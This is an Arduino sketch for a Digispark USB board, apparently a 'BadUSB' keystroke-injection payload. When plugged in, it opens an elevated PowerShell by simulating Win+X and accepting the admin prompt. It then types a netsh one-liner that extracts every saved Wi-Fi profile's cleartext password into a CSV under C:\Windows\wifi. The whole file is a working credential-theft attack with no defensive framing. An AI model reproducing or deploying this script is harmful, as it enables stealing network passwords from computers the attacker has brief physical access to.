#include <DigiKeyboard.h>
#include <DigiKeyboardFr.h>

const int LED_PIN = 1; // Define o pino onde o LED está conectado
const int TIMER = 1500; // Define um timer padrao

void setup() {
  pinMode(LED_PIN, OUTPUT);
}

void start(){
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  digitalWrite(LED_PIN, HIGH); // LED on <--> Action start
}

void finish(){
  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*Infinite loop to disconnect device*/ }
}

void loop() {
  start();

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(TIMER);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(TIMER);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(TIMER);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(TIMER);
  DigiKeyboard.println(F("MD c:\\Windows\\wifi"));
  DigiKeyboard.delay(TIMER);
  DigiKeyboard.println(F("(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -Path c:\\Windows\\wifi\\wifi.csv"));
  DigiKeyboard.delay(TIMER);
  DigiKeyboard.println(F("exit"));

  finish();
}